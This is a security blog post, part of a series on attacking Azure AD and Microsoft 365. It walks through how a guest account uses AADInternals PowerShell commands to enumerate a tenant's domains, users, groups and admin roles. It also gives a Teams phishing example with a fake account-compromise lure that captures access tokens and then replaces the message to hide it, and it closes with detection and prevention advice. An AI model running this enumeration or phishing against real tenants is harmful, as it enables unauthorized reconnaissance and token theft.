+++
title = "Quest for guest access: Azure Active Directory reconnaissance as a guest"
date = "2020-06-14"
lastmod = "2020-09-06"
categories =["blog"]
tags = ["Azure Active Directory","Azure","reconnaissance","security","guest"]
thumbnail = "/images/posts/QuestForGuest.png"
+++

This post is part 2/5 of <a href="/aadkillchain/" target="_blank">Azure AD and Microsoft 365 kill chain</a> blog series.

When sharing SharePoint to people outside the organisations or inviting them to Teams, a corresponding guest account is created to Azure AD. 
Although the created guest account is not a pure insider, it has wide read-only access to organisation's Azure AD information.

In this blog, using **AADInternals v0.4.0**, I'll show how to gather information from Azure AD tenant as a guest user. 

<!--more-->
# Background
According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">documentation</a> [Jun 23 2020]
the guest users have the following permissions to Azure AD:

Area | Guest user permissions
--- | --- 
Users and contacts | Read own properties. <br> Read display name, email, sign in name, photo, user principal name, and user type **properties of other users and contacts**. Change own password
Groups             | Read all **properties of groups**. <br>Read non-hidden group memberships. <br>Read hidden Office 365 group memberships for joined groups. <br>Manage owned groups. <br>Add guests to owned groups (if allowed). <br>Delete owned groups. <br>Restore owned Office 365 groups. <br>Read **properties of groups they belong to**, including membership.
Applications       | Read properties of registered and enterprise applications. <br>Manage application properties, assignments, and credentials for owned applications. <br>Delete owned applications. <br>Restore owned applications
Devices            | Delete owned devices
Directory		   | **Read display name and verified domains**
Roles and scopes   | No permissions
Subscriptions      | No permissions
Policies           | No permissions

The list above is controversial with another <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">section</a> in the same documentation [Jun 23 2020]:

> Guest users have **restricted directory permissions**. For example, guest users **cannot browse information from the tenant beyond their own profile information**. 
> However, a guest user **can retrieve information about another user by providing the User Principal Name or objectId**. A guest user **can read properties of groups they belong to**, 
> including group membership, regardless of the Guest users permissions are limited setting. A guest **cannot view information about any other tenant objects**.

To sum up, guest users **CAN NOT list objects** (such as users or groups), but they **CAN read object properties**, as long as the id (or user name) of the object is known.


# Azure Active Directory account
Any user having access to Office/Microsoft 365 have an Azure AD account. Thus, everyone can log in at <a href="https://account.activedirectory.windowsazure.com/" target="_blank">account.activedirectory.windowsazure.com</a>
and see the list of organisations they have access to. This list includes all the organisations who have shared SharePoint sites with the user of invited the user to Teams.

![Azure AD account](/images/posts/quest4guest_1.png)

AADInternals can be used to list the tenants the user have access to. 
{{< highlight powershell >}}
# Prompt for credentials and save the token to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the user's tenants
Get-AADIntAzureTenants
{{< /highlight>}}
Output:
```
Id                                   Country Name                      Domains                                                                                                  
--                                   ------- ----                      -------                                                                                                  
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy                  {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd               {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
```

# Azure AD reconnaissance

## Azure AD tenant information
As we now know where we have guest access to, we can extract some interesting details from the target organisation.

First step here is to get a new access token for the target tenant (this only has to be done if the tenant has MFA enabled) and
invoke the reconnaissance. The function will ask you to choose the target tenant:
{{< highlight powershell >}}
# Prompt for credentials for Company Ltd tenant and save the token to cache
Get-AADIntAccessTokenForAzureCoreManagement -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd -SaveToCache

# Invoke the reconnaissance and save results to a variable
$results = Invoke-AADIntReconAsGuest
{{< /highlight>}}
Output:
```
Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
```
The function prints out some relevant information, such as the number of Azure AD objects and quota, and the number of domains (both verified and unverified).

**Note!** According to the <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions#compare-member-and-guest-default-permissions" target="_blank">documentation</a> mentioned above,
**guest users should not have no access to unverified domains**. Unverified domains can contain business secrets, such as names of products and services currently under development. 

This clearly is not true, as guest users can access details of all domains:
{{< highlight powershell >}}
# List the domains
$results.domains | Select-Object id,authen*,isverified,supported*,password* | Format-Table
{{< /highlight>}}
Output:
```
id                               authenticationType isVerified supportedServices                                                passwordValidityPeriodInDays passwordNotificationWindowInDays
--                               ------------------ ---------- -----------------                                                ---------------------------- --------------------------------
company.mail.onmicrosoft.com     Federated                True {}                                                               2147483647                   30
company.onmicrosoft.com          Federated                True {Email, OfficeCommunicationsOnline}
www.company.com                  Federated                True {Sharepoint}
company.com                      Federated                True {Email, OfficeCommunicationsOnline, OrgIdAuthentication, Intune} 2147483647                   30
ournewproduct.com                Managed                 False {}
service.org                      Managed                 False {}
```

From the output, we can see all the domains, their authentication type, verification status, supported servers, and password validity period. 
The password validity period of 2147483647 (0x7FFFFFFF) indicates that passwords do not expire. Well, actually they do but in 6 million years.

To see what rights the user actually has to target tenant (if available) can also be listed:
{{< highlight powershell >}}
# List allowed actions of the logged in user (if available)
$results.allowedActions
{{< /highlight>}}
Output:
```
application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
```
This reveals that the user actually has read access to all aforementioned Azure AD objects.

## User enumeration

As already mentioned, guest users do have a read-only access to Azure AD. I've known this for years but I haven't found a way to get a proper access tokess to Azure AD. 
Well, actually, that is not entirely true.

With <a href="/post/aadbackdoor/" target="_blank">identity federation</a> and <a href="/post/kerberos/" target="_blank">Seamless SSO</a> backdoors one could forge a SAML or Kerberos token. This way it was possible
to log-in as a guest user and get an access token which worked with Azure AD and MSOnline PowerShell modules. However, I haven't found (yet) a way to get a working access token without backdoors.

Lately, as I was playing with Azure Core Management API, I noticed that I was able to access <a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-1.0" target="_blank">MS Graph API</a> as a guest user!

This, together what we know about guest users' access rights to Azure AD, enables us to perform following reconnaissance: 

**Stage 1**: If we know the user id or upn of any user of the tenant, we can
list all the groups (including teams and roles) the user is member of. As a result, we now know the ids of those groups, and we can retrieve the list of members of those groups.

**Stage 2**: Now we can retrieve the same information (groups and their members) for each user found at stage 1!

![Azure AD account](/images/posts/quest4guest_2.png)

To be able to read the directory entries, we need a starting point. If we don't know any user principal name from the target AAD, we can use our own name (as it is probably a member of a group or Teams).

Lets start by running the user enumeration and include manager, subordinates, and groups members:
{{< highlight powershell >}}
# Invoke the user enumeration
$results = Invoke-AADIntUserEnumerationAsGuest -GroupMembers -Manager -Subordinates -Roles
{{< /highlight>}}
Output:
```
Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        5
Groups:       2
Roles:        0
```

Lets list some relevant information from the returned groups:

{{< highlight powershell >}}
# List group information
$results.Groups | Select-Object displayName,id,membershiprule,description
{{< /highlight>}}
Output:
```
displayName          id                                   membershipRule                                                             description                   
-----------          --                                   --------------                                                             -----------                   
All guests           b4c40137-6d42-4102-aa3b-023ba7d6e484 (user.userType -eq "Guest") or (user.userPrincipalName -match ".*#EXT#.*") All guests and externals users
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c                                                                            Teams with externals
```

Many organisations have created a <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/groups-create-rule" target="_blank">dynamic group</a> to contain all
guest and/or extrernal users. Usually this is used to assign conditional access rules etc. to these users. However, the group will contain all guests of the organisation, including business partners, clients, etc.
And yes, **guest users can list the members of any group**!

{{< highlight powershell >}}
# List group information
$results.Groups | Select-Object displayName,id,members
{{< /highlight>}}
Output:
```
displayName          id                                   members                                                                                                                                                              
-----------          --                                   -------                                                                                                                                                              
All guests           b4c40137-6d42-4102-aa3b-023ba7d6e484 {user_gmail.com#EXT#@Mcompany.onmicrosoft.com, user_outlook.com#EXT#@company.onmicrosoft.com, ...}
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c {user@company.com, admin@company.onmicrosoft.com, user_outlook.com#EXT#@Mcompany.onmicrosoft.com} 
```
Now we have **the list of all external users of the tenant**! 

But wait, there is more! 

From the other group "Teams with externals" we can see the email address of tenant's user. With that, we can drill down even deeper to Azure AD.
The following will extract all users from all the groups the given user is member of (stage 2)!
{{< highlight powershell >}}
# Invoke the user enumeration for the known user including group members
$results = Invoke-AADIntUserEnumerationAsGuest -UserName "user@company.com" -GroupMembers -Manager -Subordinates -Roles
{{< /highlight>}}
Output:
```
Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        32
Groups:       4
Roles:        3
```
And now we can see all the groups the user is member of:
{{< highlight powershell >}}
# List group information
$results.Groups | Select-Object displayName,id,membershiprule,description
{{< /highlight>}}
Output:
```
displayName          id                                   membershipRule               description                                                                                     
-----------          --                                   --------------               -----------                                                                                     
Secret stuff teams   740f43a5-c7f8-4a1a-a6b8-2d57a1f6cda6                              This teams is meant for internal secret stuff! Mostly sensitive discussions with M&A candidates.
Teams with externals b25791fc-7c20-4027-93d8-4a39a9ed186c                              Teams with externals                                                                            
abc                  9202b94b-5381-4270-a3cb-7fcf0d40fef1                              abc                                                                                             
All company          2ce444bc-6112-4429-922c-dbf6be59a6c3 (user.userType -eq "Member") All company users 
```

Listing the group information reveals another typical configuration. There is a dynamic group for all organisation members: **this allows guest users to access all users of the tenant!**

The last recon results includes also three roles. Roles are normal Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">admin roles</a>.
The role id does not match to those well-known ids used with AzureAD and MSOnline modules. In MS Graph API, those ids are called roleTemplateIds, which the actual roles are referring to.
For instance, if the role is a Global Admin, its roleTemplateId would be 62e90394-69f5-4237-9190-012177145e10.
Unfortunately, guest users can only read the id of each role but not the roleTemplateId. So, the actual role (Global Admin, etc.) is not known.

{{< highlight powershell >}}
# List role information
$results.Roles | Select-Object id,members
{{< /highlight>}}
Output:
```
id                                   members                                                                                                                                   
--                                   -------                                                                                                                                   
8b517a6e-d13e-4e97-a2c0-278ae38d46a6 {test.user@company.com}                                                                                                         
294cdfc8-abb4-419f-bdbb-c5d616644f9a {Sync_SERVER1_895b43df@company.com}
028e7f7b-c99a-41bb-9d5c-2d22457b5549 {admin@company.com, admin@company.onmicrosoft.com}     
```
From the output, we can make an assumption that the second role would be a "Directory Synchronization Accounts" role and the last one "Global Adminisrator" role.

# Phishing

Just like the <a href="/post/just-looking#phishing" target="_blank">outsider</a> can <a href="/post/phishing/#email" target="_blank">send phishing emails</a>, so can guests. 
However, guests and <a href="/post/insider" target="_blank">insiders</a> can also <a href="/post/phishing/#teams" target="_blank">send phishing messages using Teams</a>.

The message to be sent can be customised. When using Teams for phishing, AADInternals replaces the original phishing message with a clean message after the tokens are received.
This message can be customise with -CleanMessage parameter.

The example below sends a custom message:
{{< highlight powershell >}}
# Send a phishing email to recipients using customised messages and save the tokens to cache
$message = 'Your Microsoft account has been compromised. Login at <a href="{1}">https://microsoft.com</a> to reset your password. <br> Use the following security code: <b>{0}</b>.' 
Invoke-AADIntPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Message $message -CleanMessage "🙂" -Teams -SaveToCache
{{< /highlight>}}
```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
Mail sent to: wvictim2@company.com
...
Received access token for william.victim@company.com
```


# Detecting

Azure AD <a href="https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-reports-data-retention#how-long-does-azure-ad-store-the-data" target="_blank">sign-in log</a>
is now available for all Azure AD editions. So, this would be an obvious place to start with. However, the AADInternals functions are using the application id of Microsoft Office (d3590ed6-52b3-4102-aeff-aad2292ab01c).
This means that getting a new access token seems to be a legit login event. 

The API calls to Azure AD are not logged and therefore the users' actions can not be detected.

# Preventing

Traditionally only thing to restrict guests access was to <a href="/post/limit-user-access/#block-users-access-to-others-information" target="_blank">block access to other users' data</a> for all users.
Unfortunately, this also prevented normal users from adding others to Teams and groups so it was not very practical way.

However, there is a new feature in preview which allows restricting guests access to group members:

![Restrict guests](/images/posts/quest4guest_4.png)

This effectively prevents guests for enumerating organisation groups and users :thumbsup:

Therefore, **I urge every administrator to limit guests access IMMEDIATELY!** Go to User settings <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/UsersManagementMenuBlade/UserSettings" target="_blank">here</a> and 
click "Manage external collaboration settings".


# Summary

Inviting people outside of the organisation to Teams gives them access to Azure AD of the tenant. As demonstrated, guests can crawl the entire Azure AD and get information not meant for their eyes - with no traces of
rogue behaviour! 
This may lead to loss of business secrets.

Restricting guest access (preview feature) prevents guests for enumerating users and groups, but does not block tenant recon.

I strongly suggest avoiding using the dynamic groups that include all guest users or all company users. This would help limiting the guest user access to potential sensitive data, such as customer information.

**Note:** If people are leaving the organisation, they might have invited themselves using their personal emails to maintain access to Azure AD (I know I would :speak_no_evil:). 
So, if you are an admin, remember to double-check for any guest accounts the leaving user have invited.

**Tip:** To hide your on-coming new products from the guests, do not register the corresponding domain names to Azure AD!

# References
* <a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-1.0" target="_blank">MS Graph API v1.0 reference</a> 
* <a href="https://docs.microsoft.com/en-us/graph/api/overview?view=graph-rest-beta" target="_blank">MS Graph API beta reference</a> 
* <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/users-default-permissions" target="_blank">What are the default user permissions in Azure Active Directory?</a>
* <a href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles" target="_blank">Administrator role permissions in Azure Active Directory</a>